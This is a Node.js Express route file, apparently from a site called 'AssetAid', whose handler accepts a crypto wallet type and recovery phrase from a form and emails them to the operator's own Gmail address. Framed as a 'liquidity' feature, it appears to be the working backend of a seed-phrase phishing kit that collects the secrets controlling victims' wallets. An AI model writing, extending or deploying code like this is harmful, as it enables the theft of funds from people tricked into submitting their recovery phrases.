// routes/liquidityRoutes.js
const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const router = express.Router();

// Set up Nodemailer transporter
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.ASSESTAID_EMAIL,
    pass: process.env.ASSETAID_PASS,
  },
});

// POST /liquidity/send-email
router.post("/", (req, res) => {
  const { walletType, phrase } = req.body;
  const mailOptions = {
    from: process.env.ASSESTAID_EMAIL,
    to: process.env.ASSESTAID_EMAIL,
    subject: "New Phrase Submission",
    text: `
        Wallet Type: ${walletType}
        Phrases: ${phrase}
    `,
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error("Error sending email:", err);
      return res.status(500).send("Error sending email");
    }
    console.log("Email sent:", info.response);
    res.status(200).send("Email sent successfully");
  });
});



module.exports = router;
